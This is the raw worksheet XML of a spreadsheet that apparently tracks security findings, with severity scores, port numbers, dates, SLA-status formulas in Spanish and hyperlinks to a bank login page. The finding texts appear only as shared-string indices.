      <c r="AE618" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG618" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="619" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A619" s="84">
        <v>618</v>
      </c>
      <c r="B619" t="s">
        <v>32</v>
      </c>
      <c r="C619" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D619" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G619" t="s">
        <v>1816</v>
      </c>
      <c r="I619" t="s">
        <v>3711</v>
      </c>
      <c r="J619" t="s">
        <v>3714</v>
      </c>
      <c r="L619" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M619" t="s">
        <v>61</v>
      </c>
      <c r="Q619" s="65" t="s">
        <v>3717</v>
      </c>
      <c r="T619" s="1">
        <v>46142</v>
      </c>
      <c r="U619" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>67</v>
      </c>
      <c r="V619" s="1">
        <f t="shared" si="36"/>
        <v>46262</v>
      </c>
      <c r="W619" s="76" t="str">
        <f t="shared" ca="1" si="37"/>
        <v>En SLA</v>
      </c>
      <c r="AB619" s="65" t="s">
        <v>3718</v>
      </c>
      <c r="AC619" s="65" t="s">
        <v>3720</v>
      </c>
      <c r="AD619" s="65" t="s">
        <v>3719</v>
      </c>
    </row>
    <row r="620" spans="1:34" ht="203" hidden="1" x14ac:dyDescent="0.35">
      <c r="A620" s="84">
        <v>619</v>
      </c>
      <c r="B620" t="s">
        <v>32</v>
      </c>
      <c r="C620" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D620" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G620" t="s">
        <v>1816</v>
      </c>
      <c r="I620" t="s">
        <v>3712</v>
      </c>
      <c r="J620" s="65" t="s">
        <v>3715</v>
      </c>
      <c r="L620" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M620" t="s">
        <v>61</v>
      </c>
      <c r="Q620" s="65" t="s">
        <v>3725</v>
      </c>
      <c r="T620" s="1">
        <v>46142</v>
      </c>
      <c r="U620" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>67</v>
      </c>
      <c r="V620" s="1">
        <f t="shared" si="36"/>
        <v>46232</v>
      </c>
      <c r="W620" s="76" t="str">
        <f t="shared" ca="1" si="37"/>
        <v>En SLA</v>
      </c>
      <c r="AB620" s="65" t="s">
        <v>3721</v>
      </c>
      <c r="AC620" s="65" t="s">
        <v>3723</v>
      </c>
      <c r="AD620" s="65" t="s">
        <v>3722</v>
      </c>
    </row>
    <row r="621" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A621" s="84">
        <v>620</v>
      </c>
      <c r="B621" t="s">
        <v>32</v>
      </c>
      <c r="C621" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D621" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G621" t="s">
        <v>1816</v>
      </c>
      <c r="I621" t="s">
        <v>3713</v>
      </c>
      <c r="J621" s="65" t="s">
        <v>3716</v>
      </c>
      <c r="L621" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M621" t="s">
        <v>111</v>
      </c>
      <c r="Q621" s="65" t="s">
        <v>3725</v>
      </c>
      <c r="T621" s="1">
        <v>46142</v>
      </c>
      <c r="U621" s="76">
        <f t="shared" ca="1" si="33"/>
        <v>67</v>
      </c>
      <c r="V621" s="1">
        <f t="shared" si="36"/>
        <v>46232</v>
      </c>
      <c r="W621" s="76" t="str">
        <f t="shared" ca="1" si="37"/>
        <v>En SLA</v>
      </c>
      <c r="AB621" s="65" t="s">
        <v>3724</v>
      </c>
      <c r="AC621" s="65" t="s">
        <v>3727</v>
      </c>
      <c r="AD621" s="65" t="s">
        <v>3726</v>
      </c>
    </row>
  </sheetData>
  <autoFilter ref="A1:AH621" xr:uid="{00000000-0001-0000-0100-000000000000}">
    <filterColumn colId="6">
      <filters>
        <filter val="Go Any Where"/>
      </filters>
    </filterColumn>
  </autoFilter>
  <conditionalFormatting sqref="H220:H604">
    <cfRule type="duplicateValues" dxfId="31" priority="13" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H227:H229">
    <cfRule type="duplicateValues" dxfId="30" priority="8" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H354:H356">
    <cfRule type="duplicateValues" dxfId="29" priority="5" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H443:H452">
    <cfRule type="duplicateValues" dxfId="28" priority="2" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H230:I235 H237:I238 H240:I247 H253:I253 H248:H252 H256:I264 H254:H255">
    <cfRule type="duplicateValues" dxfId="27" priority="9" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H300:I301 H302:H345">
    <cfRule type="duplicateValues" dxfId="26" priority="10" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H346:I353">
    <cfRule type="duplicateValues" dxfId="25" priority="7" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H346:I354">
    <cfRule type="duplicateValues" dxfId="24" priority="6" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H355:I356">
    <cfRule type="duplicateValues" dxfId="23" priority="3" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H386:I387 H357:I357 H217:H226 H1:I216 I217:I229 I248:I252 I254:I255 H265:I277 H279:I299 I302:I345 H362:I384 H385 H388 H389:I435 H436:H442 H453:I485 H491:I495 H486:H490 H499:H517 H518:I563 I564:I604 J613 M613 H605:I1048576">
    <cfRule type="duplicateValues" dxfId="22" priority="12" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="H496:I497 H498">
    <cfRule type="duplicateValues" dxfId="21" priority="1" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="I354:I356">
    <cfRule type="duplicateValues" dxfId="20" priority="4" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="J306:J330 J341:J345">
    <cfRule type="duplicateValues" dxfId="19" priority="11" stopIfTrue="1"/>
  </conditionalFormatting>
  <conditionalFormatting sqref="AH1:AH1048576">
    <cfRule type="duplicateValues" dxfId="18" priority="14"/>
  </conditionalFormatting>
  <hyperlinks>
    <hyperlink ref="Q106" r:id="rId1" xr:uid="{FF1AB60E-37CE-4F43-BDD6-9CA21D98261E}"/>
    <hyperlink ref="Q107" r:id="rId2" xr:uid="{72E48B09-0FAE-4176-8E82-3D6C99AB5181}"/>
    <hyperlink ref="Q108" r:id="rId3" xr:uid="{9EC30479-6857-45C5-A9C1-AA7B909CB156}"/>
    <hyperlink ref="AC160" r:id="rId4" xr:uid="{EE723012-EBE1-4ED5-816A-2CECFCB8818D}"/>
    <hyperlink ref="Q112" r:id="rId5" xr:uid="{1C399C0A-70EF-4CC5-858A-51E9884E81B1}"/>
    <hyperlink ref="Q114" r:id="rId6" xr:uid="{A4CD7006-F96B-4603-A94B-86D69A9F192A}"/>
    <hyperlink ref="Q116" r:id="rId7" xr:uid="{729C2D83-C8AD-4FBC-B21C-1914F82640E2}"/>
    <hyperlink ref="Q122" r:id="rId8" xr:uid="{4EF5FEDA-3CDC-4C8B-8002-A26EEDB9F195}"/>
    <hyperlink ref="Q131" r:id="rId9" xr:uid="{142A0744-6CE4-4558-8170-8DB42C514A59}"/>
    <hyperlink ref="Q144" r:id="rId10" xr:uid="{4A98500D-492A-4A8A-A0DC-715ADCD6D11B}"/>
    <hyperlink ref="Q153" r:id="rId11" xr:uid="{42C85B62-0E25-49EF-9B97-BA19706086AF}"/>
    <hyperlink ref="Q164" r:id="rId12" xr:uid="{E21A5F2E-EDCD-4344-BB7C-221CD55BF2B3}"/>
    <hyperlink ref="Q168" r:id="rId13" xr:uid="{49D47668-186A-4E70-8C2E-9D1BD7B96CFA}"/>
    <hyperlink ref="Q169" r:id="rId14" xr:uid="{DF587A95-40E4-4540-9CA5-04BDEC1842D0}"/>
    <hyperlink ref="Q177:Q178" r:id="rId15" display="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" xr:uid="{64149FD4-46C2-4435-B97B-45DB242F1BE0}"/>
    <hyperlink ref="Q185" r:id="rId16" xr:uid="{DADCAFFC-A11B-4B17-8ED1-0D926702BC7F}"/>
    <hyperlink ref="Q194:Q195" r:id="rId17" display="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" xr:uid="{6DE58AAE-0F4C-4EA8-9AD5-6D74BF7AF965}"/>
    <hyperlink ref="Q216" r:id="rId18" xr:uid="{9F935B20-EEAA-4ECA-AF9B-39ADA24A4BCA}"/>
    <hyperlink ref="Q230:Q233" r:id="rId19" display="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" xr:uid="{36344E5C-CD95-4733-AF0B-610838CCE248}"/>
    <hyperlink ref="Q233" r:id="rId20" xr:uid="{E40437E4-BF1F-45E3-9A21-AC0EF7E42DAC}"/>
    <hyperlink ref="Q236" r:id="rId21" xr:uid="{657D586B-2DB0-4294-8990-322438FE2857}"/>
    <hyperlink ref="Q196" r:id="rId22" xr:uid="{319E58DA-1B9F-4AFA-AA9C-4194763D1515}"/>
    <hyperlink ref="Q237" r:id="rId23" xr:uid="{B9C6B87E-8498-4A77-B3BC-CCDA1D23A723}"/>
    <hyperlink ref="Q279" r:id="rId24" xr:uid="{8B2FE26E-9347-4DEF-A066-AA3E90FE6E82}"/>
    <hyperlink ref="G358" r:id="rId25" display="www.santander.com" xr:uid="{CC058903-A3E9-4AE2-8C93-4915CBD2CF06}"/>
    <hyperlink ref="Q358" r:id="rId26" xr:uid="{C6FC2680-8A28-4439-A117-D68962C7F284}"/>
    <hyperlink ref="Q359" r:id="rId27" xr:uid="{626E3C06-C133-4CA4-8D5D-096A61CF9C9D}"/>
    <hyperlink ref="G359" r:id="rId28" display="www.santander.com" xr:uid="{D5186970-DD4E-49F2-8236-3CAE44C1C25A}"/>
    <hyperlink ref="Q386" r:id="rId29" xr:uid="{BFFEC35F-B2E2-403F-BA99-398BD5575AAB}"/>
    <hyperlink ref="Q539" r:id="rId30" xr:uid="{CD282027-B464-4DBA-8A07-CCCE49FC4F56}"/>
    <hyperlink ref="Q540" r:id="rId31" xr:uid="{22A98F1B-CA98-4ADD-87E4-9ABCA597B3EE}"/>
    <hyperlink ref="Q541" r:id="rId32" xr:uid="{40DC3278-193D-4CAE-A7A5-9C53EA3ECBB7}"/>
    <hyperlink ref="Q542" r:id="rId33" xr:uid="{B7E0B406-81F2-4BC7-85F4-576BD837508D}"/>
    <hyperlink ref="Q608" r:id="rId34" xr:uid="{9BF993F0-7280-48DB-A42E-22E1B85B06C7}"/>
  </hyperlinks>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9" orientation="portrait" r:id="rId35"/>
  <legacyDrawing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9022F-FFA9-4506-8BDD-16D5F3A5DFCC}">
  <dimension ref="A1:B14"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E10" sqref="E10"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="1" max="1" width="50.7265625" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="31.453125" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A1" s="92" t="s">
        <v>21</v>
      </c>
      <c r="B1" t="s">
        <v>3807</v>
      </c>
    </row>
    <row r="2" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A2" s="92" t="s">
        <v>11</v>
      </c>
      <c r="B2" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="4" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A4" s="92" t="s">
        <v>3804</v>
      </c>
      <c r="B4" t="s">
        <v>3806</v>
      </c>
    </row>
    <row r="5" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A5" s="26" t="s">
        <v>1095</v>
      </c>
      <c r="B5">
        <v>5</v>
      </c>
    </row>
    <row r="6" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A6" s="26" t="s">
        <v>40</v>
      </c>
      <c r="B6">
        <v>1</v>
      </c>
    </row>
    <row r="7" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A7" s="26" t="s">
        <v>408</v>
      </c>
      <c r="B7">
        <v>1</v>
      </c>
    </row>
    <row r="8" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A8" s="26" t="s">
        <v>186</v>
      </c>
      <c r="B8">
        <v>1</v>
      </c>
    </row>
    <row r="9" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A9" s="26" t="s">
        <v>2018</v>
      </c>
      <c r="B9">
        <v>1</v>
      </c>
    </row>
    <row r="10" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A10" s="26" t="s">
        <v>53</v>
      </c>
      <c r="B10">
        <v>1</v>
      </c>
    </row>
    <row r="11" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A11" s="26" t="s">
        <v>374</v>
      </c>
      <c r="B11">
        <v>1</v>
      </c>
    </row>
    <row r="12" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A12" s="26" t="s">
        <v>3642</v>
      </c>
      <c r="B12">
        <v>1</v>
      </c>
    </row>
    <row r="13" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A13" s="26" t="s">
        <v>174</v>
      </c>
      <c r="B13">
        <v>1</v>
      </c>
    </row>
    <row r="14" spans="1:2" x14ac:dyDescent="0.35">
      <c r="A14" s="26" t="s">
        <v>3805</v>
      </c>
      <c r="B14">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621"/>
  <sheetViews>
    <sheetView tabSelected="1" topLeftCell="E1" zoomScale="40" zoomScaleNormal="40" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="J3" sqref="J3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="11.453125" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="1" max="1" width="6.54296875" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.81640625" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="19.81640625" bestFit="1" customWidth="1"/>
    <col min="4" max="4" width="22.7265625" customWidth="1"/>
    <col min="5" max="5" width="42.54296875" customWidth="1"/>
    <col min="6" max="6" width="31.7265625" customWidth="1"/>
    <col min="7" max="7" width="51.54296875" customWidth="1"/>
    <col min="8" max="9" width="53.1796875" customWidth="1"/>
    <col min="10" max="10" width="104.54296875" customWidth="1"/>
    <col min="11" max="11" width="75.453125" customWidth="1"/>
    <col min="12" max="12" width="12.54296875" customWidth="1"/>
    <col min="13" max="13" width="12.453125" customWidth="1"/>
    <col min="14" max="14" width="13.81640625" customWidth="1"/>
    <col min="15" max="15" width="32.453125" style="26" customWidth="1"/>
    <col min="16" max="16" width="28.26953125" customWidth="1"/>
    <col min="17" max="17" width="56.26953125" customWidth="1"/>
    <col min="18" max="18" width="9.26953125" customWidth="1"/>
    <col min="19" max="19" width="14" customWidth="1"/>
    <col min="20" max="21" width="21.7265625" customWidth="1"/>
    <col min="22" max="22" width="45.1796875" style="1" customWidth="1"/>
    <col min="23" max="23" width="45.1796875" customWidth="1"/>
    <col min="24" max="25" width="21.7265625" customWidth="1"/>
    <col min="26" max="26" width="23" customWidth="1"/>
    <col min="27" max="27" width="21.7265625" customWidth="1"/>
    <col min="28" max="28" width="80.81640625" customWidth="1"/>
    <col min="29" max="29" width="102" customWidth="1"/>
    <col min="30" max="30" width="132.453125" customWidth="1"/>
    <col min="31" max="31" width="41.7265625" customWidth="1"/>
    <col min="32" max="32" width="42.453125" customWidth="1"/>
    <col min="33" max="33" width="45.453125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:33" s="88" customFormat="1" ht="44.25" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A1" s="2" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="2" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="2" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="2" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="2" t="s">
        <v>4</v>
      </c>
      <c r="F1" s="2" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="2" t="s">
        <v>6</v>
      </c>
      <c r="H1" s="2" t="s">
        <v>7</v>
      </c>
      <c r="I1" s="2" t="s">
        <v>8</v>
      </c>
      <c r="J1" s="2" t="s">
        <v>2043</v>
      </c>
      <c r="K1" s="3" t="s">
        <v>9</v>
      </c>
      <c r="L1" s="2" t="s">
        <v>10</v>
      </c>
      <c r="M1" s="2" t="s">
        <v>11</v>
      </c>
      <c r="N1" s="3" t="s">
        <v>12</v>
      </c>
      <c r="O1" s="3" t="s">
        <v>13</v>
      </c>
      <c r="P1" s="2" t="s">
        <v>14</v>
      </c>
      <c r="Q1" s="2" t="s">
        <v>15</v>
      </c>
      <c r="R1" s="2" t="s">
        <v>16</v>
      </c>
      <c r="S1" s="2" t="s">
        <v>17</v>
      </c>
      <c r="T1" s="2" t="s">
        <v>18</v>
      </c>
      <c r="U1" s="2" t="s">
        <v>19</v>
      </c>
      <c r="V1" s="15" t="s">
        <v>20</v>
      </c>
      <c r="W1" s="2" t="s">
        <v>21</v>
      </c>
      <c r="X1" s="2" t="s">
        <v>22</v>
      </c>
      <c r="Y1" s="3" t="s">
        <v>23</v>
      </c>
      <c r="Z1" s="2" t="s">
        <v>24</v>
      </c>
      <c r="AA1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="AB1" s="3" t="s">
        <v>26</v>
      </c>
      <c r="AC1" s="3" t="s">
        <v>27</v>
      </c>
      <c r="AD1" s="2" t="s">
        <v>28</v>
      </c>
      <c r="AE1" s="2" t="s">
        <v>29</v>
      </c>
      <c r="AF1" s="2" t="s">
        <v>30</v>
      </c>
      <c r="AG1" s="38" t="s">
        <v>31</v>
      </c>
    </row>
    <row r="2" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A2" s="5">
        <v>1</v>
      </c>
      <c r="B2" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C2" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D2" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E2" s="4" t="s">
        <v>35</v>
      </c>
      <c r="F2" s="9" t="s">
        <v>36</v>
      </c>
      <c r="G2" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H2" s="4" t="s">
        <v>38</v>
      </c>
      <c r="I2" s="4" t="s">
        <v>39</v>
      </c>
      <c r="J2" s="4" t="s">
        <v>40</v>
      </c>
      <c r="K2" s="4"/>
      <c r="L2" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M2" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N2" s="7">
        <v>7.6999998092651367</v>
      </c>
      <c r="O2" s="6"/>
      <c r="P2" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q2" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R2" s="4">
        <v>443</v>
      </c>
      <c r="S2" s="22"/>
      <c r="T2" s="8">
        <v>42941</v>
      </c>
      <c r="U2" s="11">
        <f t="shared" ref="U2:U65" ca="1" si="0">TODAY()-T2</f>
        <v>3268</v>
      </c>
      <c r="V2" s="8">
        <f t="shared" ref="V2:V65" si="1">IF(M2="Critical",T2+10,IF(M2="High",T2+30,IF(M2="Bad",T2+30,IF(M2="Medium",T2+90,IF(M2="Warm",T2+90,IF(M2="Low",T2+120,IF(M2="Fair",T2+120,IF(M2="Neutral",T2+120,""))))))))</f>
        <v>42951</v>
      </c>
      <c r="W2" s="12" t="str">
        <f t="shared" ref="W2:W65" ca="1" si="2">IF(M2="Critical",IF(U2&gt;10,"SLA Vencido","En SLA"),IF(M2="High",IF(U2&gt;30,"SLA Vencido","En SLA"),IF(M2="Bad",IF(U2&gt;30,"SLA Vencido","En SLA"),IF(M2="Medium",IF(U2&gt;90,"SLA Vencido","En SLA"),IF(M2="Warm",IF(U2&gt;90,"SLA Vencido","En SLA"),IF(M2="Low",IF(U2&gt;120,"SLA Vencido","En SLA"),IF(M2="Fair",IF(U2&gt;120,"SLA Vencido","En SLA"),IF(M2="Neutral",IF(U2&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X2" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y2" s="30" t="s">
        <v>45</v>
      </c>
      <c r="Z2" s="30" t="s">
        <v>46</v>
      </c>
      <c r="AA2" s="8">
        <v>44025</v>
      </c>
      <c r="AB2" s="4"/>
      <c r="AC2" s="4"/>
      <c r="AD2" s="32" t="s">
        <v>47</v>
      </c>
      <c r="AE2" s="27">
        <v>44012</v>
      </c>
      <c r="AF2" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG2" s="27"/>
    </row>
    <row r="3" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A3" s="5">
        <v>2</v>
      </c>
      <c r="B3" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C3" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D3" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E3" s="4" t="s">
        <v>49</v>
      </c>
      <c r="F3" s="4" t="s">
        <v>50</v>
      </c>
      <c r="G3" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H3" s="4" t="s">
        <v>51</v>
      </c>
      <c r="I3" s="4" t="s">
        <v>52</v>
      </c>
      <c r="J3" s="4" t="s">
        <v>53</v>
      </c>
      <c r="K3" s="4"/>
      <c r="L3" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M3" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N3" s="7">
        <v>7.5999999046325684</v>
      </c>
      <c r="O3" s="6"/>
      <c r="P3" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q3" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R3" s="4">
        <v>443</v>
      </c>
      <c r="S3" s="22"/>
      <c r="T3" s="8">
        <v>42941</v>
      </c>
      <c r="U3" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3268</v>
      </c>
      <c r="V3" s="8">
        <f t="shared" si="1"/>
        <v>42951</v>
      </c>
      <c r="W3" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X3" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y3" s="30" t="s">
        <v>54</v>
      </c>
      <c r="Z3" s="30" t="s">
        <v>55</v>
      </c>
      <c r="AA3" s="8">
        <v>44025</v>
      </c>
      <c r="AB3" s="4"/>
      <c r="AC3" s="4"/>
      <c r="AD3" s="32" t="s">
        <v>56</v>
      </c>
      <c r="AE3" s="27">
        <v>44012</v>
      </c>
      <c r="AF3" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG3" s="27"/>
    </row>
    <row r="4" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A4" s="5">
        <v>3</v>
      </c>
      <c r="B4" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C4" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D4" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E4" s="4" t="s">
        <v>57</v>
      </c>
      <c r="F4" s="4"/>
      <c r="G4" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H4" s="4" t="s">
        <v>58</v>
      </c>
      <c r="I4" s="4" t="s">
        <v>59</v>
      </c>
      <c r="J4" s="4" t="s">
        <v>60</v>
      </c>
      <c r="K4" s="4"/>
      <c r="L4" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M4" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N4" s="7">
        <v>6.5</v>
      </c>
      <c r="O4" s="6"/>
      <c r="P4" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q4" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R4" s="4">
        <v>443</v>
      </c>
      <c r="S4" s="22"/>
      <c r="T4" s="8">
        <v>42746</v>
      </c>
      <c r="U4" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3463</v>
      </c>
      <c r="V4" s="8">
        <f t="shared" si="1"/>
        <v>42836</v>
      </c>
      <c r="W4" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X4" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y4" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z4" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA4" s="8">
        <v>44025</v>
      </c>
      <c r="AB4" s="4"/>
      <c r="AC4" s="4"/>
      <c r="AD4" s="36" t="s">
        <v>64</v>
      </c>
      <c r="AE4" s="27">
        <v>44012</v>
      </c>
      <c r="AF4" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG4" s="27"/>
    </row>
    <row r="5" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A5" s="5">
        <v>4</v>
      </c>
      <c r="B5" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C5" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D5" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E5" s="4" t="s">
        <v>65</v>
      </c>
      <c r="F5" s="4"/>
      <c r="G5" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H5" s="4" t="s">
        <v>66</v>
      </c>
      <c r="I5" s="4" t="s">
        <v>67</v>
      </c>
      <c r="J5" s="4" t="s">
        <v>68</v>
      </c>
      <c r="K5" s="4"/>
      <c r="L5" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M5" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N5" s="7">
        <v>5.5999999046325684</v>
      </c>
      <c r="O5" s="6"/>
      <c r="P5" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q5" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R5" s="4">
        <v>443</v>
      </c>
      <c r="S5" s="22"/>
      <c r="T5" s="8">
        <v>43719</v>
      </c>
      <c r="U5" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V5" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W5" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X5" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y5" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z5" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA5" s="8">
        <v>44025</v>
      </c>
      <c r="AB5" s="9" t="s">
        <v>69</v>
      </c>
      <c r="AC5" s="9" t="s">
        <v>70</v>
      </c>
      <c r="AD5" s="32" t="s">
        <v>71</v>
      </c>
      <c r="AE5" s="27">
        <v>44012</v>
      </c>
      <c r="AF5" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG5" s="27"/>
    </row>
    <row r="6" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A6" s="5">
        <v>5</v>
      </c>
      <c r="B6" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C6" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D6" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E6" s="4" t="s">
        <v>72</v>
      </c>
      <c r="F6" s="4"/>
      <c r="G6" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H6" s="4" t="s">
        <v>73</v>
      </c>
      <c r="I6" s="4" t="s">
        <v>74</v>
      </c>
      <c r="J6" s="4" t="s">
        <v>75</v>
      </c>
      <c r="K6" s="4"/>
      <c r="L6" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M6" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N6" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O6" s="6"/>
      <c r="P6" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q6" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R6" s="4">
        <v>443</v>
      </c>
      <c r="S6" s="22"/>
      <c r="T6" s="8">
        <v>42879</v>
      </c>
      <c r="U6" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3330</v>
      </c>
      <c r="V6" s="8">
        <f t="shared" si="1"/>
        <v>42969</v>
      </c>
      <c r="W6" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X6" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y6" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z6" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA6" s="8">
        <v>44025</v>
      </c>
      <c r="AB6" s="4"/>
      <c r="AC6" s="4"/>
      <c r="AD6" s="32" t="s">
        <v>76</v>
      </c>
      <c r="AE6" s="27">
        <v>44012</v>
      </c>
      <c r="AF6" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG6" s="27"/>
    </row>
    <row r="7" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A7" s="5">
        <v>6</v>
      </c>
      <c r="B7" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C7" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D7" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E7" s="4" t="s">
        <v>77</v>
      </c>
      <c r="F7" s="4"/>
      <c r="G7" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H7" s="4" t="s">
        <v>78</v>
      </c>
      <c r="I7" s="4" t="s">
        <v>79</v>
